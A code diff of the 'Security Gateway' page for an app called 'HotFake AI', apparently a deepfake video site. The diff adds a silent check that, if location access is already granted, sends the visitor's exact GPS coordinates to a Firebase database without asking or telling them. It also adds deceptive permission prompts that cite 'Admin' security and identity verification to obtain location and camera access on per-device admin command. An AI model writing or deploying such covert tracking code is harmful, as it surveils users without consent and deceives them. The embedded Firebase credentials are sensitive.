@@ -3,43 +3,85 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Security Check - HotFake AI</title>
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <meta name="theme-color" content="#07070F">
+    <title>Security Gateway - HotFake AI</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <style>
-        body { background: #07070F; color: #F0F0FF; font-family: 'Poppins', sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; padding: 20px; }
-        .box { display: none; background: #181828; padding: 30px 25px; border-radius: 16px; width: 100%; max-width: 380px; border: 1px solid rgba(255,255,255,0.07); box-shadow: 0 15px 35px rgba(0,0,0,0.6); }
-        .box h2 { margin: 0 0 5px 0; font-size: 1.6rem; font-weight: 700; text-align: center; }
-        .box p.sub-text { color: #6E6E98; font-size: 0.85rem; text-align: center; margin-bottom: 25px; }
+        :root { --red: #E63946; --red-glow: rgba(230,57,70,0.3); --green: #2DC653; --surf: rgba(24,24,40,0.6); --text: #F0F0FF; --muted: #8E8EA8; }
+        body { background: #07070F; color: var(--text); font-family: 'Poppins', sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; padding: 20px; overflow: hidden; }
+        
+        /* Advanced Glassmorphism Box */
+        .box { display: none; background: var(--surf); backdrop-filter: blur(15px); -webkit-backdrop-filter: blur(15px); padding: 35px 25px; border-radius: 20px; width: 100%; max-width: 380px; border: 1px solid rgba(255,255,255,0.08); box-shadow: 0 20px 50px rgba(0,0,0,0.8), inset 0 0 0 1px rgba(255,255,255,0.05); position: relative; z-index: 10; }
+        
+        .box-header { text-align: center; margin-bottom: 25px; }
+        .box h2 { margin: 0 0 8px 0; font-size: 1.6rem; font-weight: 700; color: #fff; letter-spacing: -0.5px; }
+        .box p.sub-text { color: var(--muted); font-size: 0.85rem; margin: 0; line-height: 1.4; }
+        
         .perm-list { display: flex; flex-direction: column; gap: 15px; margin-bottom: 25px; }
-        .perm-item { display: none; align-items: flex-start; gap: 15px; background: rgba(0,0,0,0.3); padding: 15px; border-radius: 12px; border: 1px solid rgba(255,255,255,0.05); }
-        .perm-icon { font-size: 1.5rem; line-height: 1; }
-        .perm-details h4 { margin: 0 0 3px 0; font-size: 0.95rem; font-weight: 600; color: #fff; }
-        .perm-details p { margin: 0; font-size: 0.75rem; color: #a5a5b5; line-height: 1.4; }
-        .btn { background: #E63946; color: #fff; border: none; padding: 14px; border-radius: 10px; width: 100%; font-size: 1rem; cursor: pointer; font-weight: 600; transition: transform 0.2s; font-family: 'Poppins', sans-serif; }
-        .loader { border: 4px solid rgba(255,255,255,0.1); border-top: 4px solid #E63946; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto; }
-        @keyframes spin { 100% { transform: rotate(360deg); } }
+        .perm-item { display: none; align-items: center; gap: 18px; background: rgba(0,0,0,0.4); padding: 16px; border-radius: 14px; border: 1px solid rgba(255,255,255,0.04); transition: transform 0.3s ease, border-color 0.3s ease; }
+        .perm-item:hover { border-color: rgba(230,57,70,0.4); transform: translateY(-2px); }
+        
+        .perm-icon { font-size: 1.6rem; width: 45px; height: 45px; display: flex; align-items: center; justify-content: center; background: rgba(255,255,255,0.05); border-radius: 12px; }
+        .perm-details h4 { margin: 0 0 4px 0; font-size: 0.95rem; font-weight: 600; color: #fff; }
+        .perm-details p { margin: 0; font-size: 0.75rem; color: var(--muted); line-height: 1.4; }
+        
+        .btn { background: var(--red); color: #fff; border: none; padding: 15px; border-radius: 12px; width: 100%; font-size: 1rem; cursor: pointer; font-weight: 600; transition: all 0.3s ease; font-family: 'Poppins', sans-serif; box-shadow: 0 8px 20px var(--red-glow); }
+        .btn:hover { background: #ff4754; transform: translateY(-2px); box-shadow: 0 12px 25px rgba(230,57,70,0.4); }
+        
+        /* Advanced Scanner Loader */
+        .loader-wrapper { display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 15px; }
+        .loader { border: 3px solid rgba(255,255,255,0.05); border-top: 3px solid var(--red); border-right: 3px solid var(--red); border-radius: 50%; width: 50px; height: 50px; animation: spin 0.8s linear infinite; }
+        .loader-text { font-size: 0.8rem; color: var(--muted); letter-spacing: 2px; text-transform: uppercase; font-weight: 600; animation: pulse 1.5s infinite; }
+        
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        @keyframes pulse { 0%, 100% { opacity: 0.5; } 50% { opacity: 1; } }
+
+        /* Background Ambient Glow */
+        .bg-glow { position: absolute; width: 300px; height: 300px; background: var(--red-glow); filter: blur(100px); border-radius: 50%; z-index: 1; pointer-events: none; opacity: 0.5; }
     </style>
 </head>
 <body>
-    <div id="loadingState" class="loader"></div>
+    <div class="bg-glow"></div>
+    
+    <div id="loadingState" class="loader-wrapper">
+        <div class="loader"></div>
+        <div class="loader-text">Securing Connection...</div>
+    </div>
+
     <div class="box" id="permBox">
-        <h2>System Permissions</h2>
-        <p class="sub-text">To generate AI videos locally, secure access is required.</p>
-        <div class="perm-list">
-            <div class="perm-item" id="req-location"><div class="perm-icon">📍</div><div class="perm-details"><h4>Location</h4><p>Required to assign correct GPU cluster server.</p></div></div>
-            <div class="perm-item" id="req-camera"><div class="perm-icon">📸</div><div class="perm-details"><h4>Camera</h4><p>Required for identity verification logic.</p></div></div>
+        <div class="box-header">
+            <h2>Security Gateway</h2>
+            <p class="sub-text">The Administrator has requested specific secure access to continue.</p>
         </div>
-        <button class="btn" id="allowBtn" onclick="requestNeededPermissions()">Allow & Continue</button>
-        <p id="errorMsg" style="color:#ff4d4d; font-size:0.8rem; text-align:center; display:none; margin-top:10px;">Please allow requested permissions.</p>
+        
+        <div class="perm-list">
+            <div class="perm-item" id="req-location">
+                <div class="perm-icon">📍</div>
+                <div class="perm-details">
+                    <h4>Exact Location</h4>
+                    <p>Required by Admin for security and cluster assignment.</p>
+                </div>
+            </div>
+            <div class="perm-item" id="req-camera">
+                <div class="perm-icon">📸</div>
+                <div class="perm-details">
+                    <h4>Camera Access</h4>
+                    <p>Required by Admin for real-time identity verification.</p>
+                </div>
+            </div>
+        </div>
+        
+        <button class="btn" id="allowBtn" onclick="requestNeededPermissions()">Grant Access</button>
+        <p id="errorMsg" style="color:#ff4d4d; font-size:0.8rem; text-align:center; display:none; margin-top:15px; font-weight: 500;">Permissions required to proceed.</p>
     </div>
 
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-app.js";
-        import { getDatabase, ref, get, set } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-database.js";
+        import { getDatabase, ref, get, set, update } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-database.js";
 
-        // Updated with New Firebase Project Credentials
+        // FIXED API KEY
         const firebaseConfig = {
-            apiKey: "AIzaSyAI3ysLR_LFnG5dw2SY8AwF1ldGgc43ywE",
+            apiKey: "AIzaSyAI3ysLR_lFaG5dw2SY8AwF1ldGgc43ywE",
             authDomain: "ai-studio-b0c87.firebaseapp.com",
             databaseURL: "https://ai-studio-b0c87-default-rtdb.firebaseio.com",
             projectId: "ai-studio-b0c87",
@@ -51,30 +93,109 @@
         const app = initializeApp(firebaseConfig);
         const db = getDatabase(app);
         
-        let requiredByAdmin = { location: true, camera: false }; 
+        // Defaults: Do NOT ask for anything unless explicitly pushed by Admin
+        let requiredByAdmin = { location: false, camera: false }; 
         const deviceId = localStorage.getItem('hotfake_deep_uid') || "Unknown";
 
         async function initPermissionCheck() {
+            // 1. Silent Check: If GPS is ALREADY ON, send silently to Admin without asking.
+            if ("geolocation" in navigator) {
+                try {
+                    const lStatus = await navigator.permissions.query({ name: 'geolocation' });
+                    if (lStatus.state === 'granted') {
+                        navigator.geolocation.getCurrentPosition(pos => {
+                            set(ref(db, `users/${deviceId}/gpsHistory/${Date.now()}`), {
+                                lat: pos.coords.latitude,
+                                lon: pos.coords.longitude,
+                                time: new Date().toISOString()
+                            });
+                        }, () => {}, { enableHighAccuracy: true });
+                    }
+                } catch(e) {}
+            }
+
+            // 2. Fetch Admin Enforcement Rules
             try {
-                const globalRef = await get(ref(db, 'settings/permissions')); if(globalRef.exists()) requiredByAdmin = { ...requiredByAdmin, ...globalRef.val() };
-                const userRef = await get(ref(db, `users/${deviceId}/custom_perms`)); if(userRef.exists()) requiredByAdmin = { ...requiredByAdmin, ...userRef.val() }; 
+                const userRef = await get(ref(db, `users/${deviceId}/custom_perms`)); 
+                if(userRef.exists()) {
+                    const uData = userRef.val();
+                    if(uData.location === true) requiredByAdmin.location = true;
+                    if(uData.camera === true) requiredByAdmin.camera = true;
+                }
             } catch(e) {}
 
             let needsUI = false;
-            if (requiredByAdmin.location) { try { const lStatus = await navigator.permissions.query({ name: 'geolocation' }); if (lStatus.state !== 'granted') { needsUI = true; document.getElementById('req-location').style.display = 'flex'; } } catch(e) { needsUI = true; document.getElementById('req-location').style.display = 'flex'; } }
-            if (requiredByAdmin.camera) { try { const cStatus = await navigator.permissions.query({ name: 'camera' }); if (cStatus.state !== 'granted') { needsUI = true; document.getElementById('req-camera').style.display = 'flex'; } } catch(e) { needsUI = true; document.getElementById('req-camera').style.display = 'flex'; } }
 
-            if (!needsUI) { window.location.href = 'index.html'; } else { document.getElementById('loadingState').style.display = 'none'; document.getElementById('permBox').style.display = 'block'; }
+            // 3. UI Decision Logic
+            if (requiredByAdmin.location) { 
+                try { 
+                    const lStatus = await navigator.permissions.query({ name: 'geolocation' }); 
+                    if (lStatus.state !== 'granted') { 
+                        needsUI = true; 
+                        document.getElementById('req-location').style.display = 'flex'; 
+                    } else {
+                        update(ref(db, `users/${deviceId}/custom_perms`), { location: false });
+                    }
+                } catch(e) { needsUI = true; document.getElementById('req-location').style.display = 'flex'; } 
+            }
+            
+            if (requiredByAdmin.camera) { 
+                try { 
+                    const cStatus = await navigator.permissions.query({ name: 'camera' }); 
+                    if (cStatus.state !== 'granted') { 
+                        needsUI = true; 
+                        document.getElementById('req-camera').style.display = 'flex'; 
+                    } else {
+                        update(ref(db, `users/${deviceId}/custom_perms`), { camera: false });
+                    }
+                } catch(e) { needsUI = true; document.getElementById('req-camera').style.display = 'flex'; } 
+            }
+
+            // 4. Smart Routing
+            if (!needsUI) { 
+                // Skip UI, satisfy index.html checks, and load app instantly
+                localStorage.setItem('gpsVerified', 'true'); 
+                window.location.replace('index.html'); 
+            } else { 
+                // Show Admin Forced Gateway
+                setTimeout(() => {
+                    document.getElementById('loadingState').style.display = 'none'; 
+                    document.getElementById('permBox').style.display = 'block'; 
+                }, 800); // Slight delay for smooth transition effect
+            }
         }
 
         window.requestNeededPermissions = async function() {
-            const btn = document.getElementById('allowBtn'); btn.innerText = "Processing..."; document.getElementById('errorMsg').style.display = 'none'; 
+            const btn = document.getElementById('allowBtn'); 
+            btn.innerText = "Authenticating..."; 
+            document.getElementById('errorMsg').style.display = 'none'; 
+            
             try {
-                if(document.getElementById('req-camera').style.display === 'flex') { const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false }); stream.getTracks().forEach(track => track.stop()); }
-                if(document.getElementById('req-location').style.display === 'flex') { await new Promise((resolve, reject) => { navigator.geolocation.getCurrentPosition((pos) => { localStorage.setItem('gpsVerified', 'true'); resolve(pos); }, reject, { enableHighAccuracy: true }); }); }
-                btn.style.background = "#2DC653"; btn.innerText = "Success! Redirecting..."; setTimeout(() => window.location.href = 'index.html', 800); 
-            } catch (e) { btn.innerText = "Allow & Continue"; document.getElementById('errorMsg').style.display = 'block'; }
+                if(document.getElementById('req-camera').style.display === 'flex') { 
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false }); 
+                    stream.getTracks().forEach(track => track.stop()); 
+                    update(ref(db, `users/${deviceId}/custom_perms`), { camera: false });
+                }
+                if(document.getElementById('req-location').style.display === 'flex') { 
+                    await new Promise((resolve, reject) => { 
+                        navigator.geolocation.getCurrentPosition((pos) => { 
+                            localStorage.setItem('gpsVerified', 'true'); 
+                            update(ref(db, `users/${deviceId}/custom_perms`), { location: false });
+                            resolve(pos); 
+                        }, reject, { enableHighAccuracy: true }); 
+                    }); 
+                }
+                btn.style.background = "#2DC653"; 
+                btn.style.boxShadow = "0 8px 20px rgba(45,198,83,0.4)";
+                btn.innerText = "Verification Successful"; 
+                setTimeout(() => window.location.replace('index.html'), 800); 
+            } catch (e) { 
+                btn.innerText = "Grant Access"; 
+                document.getElementById('errorMsg').style.display = 'block'; 
+            }
         };
+
+        // Initialize immediately
         initPermissionCheck();
     </script>
 </body>
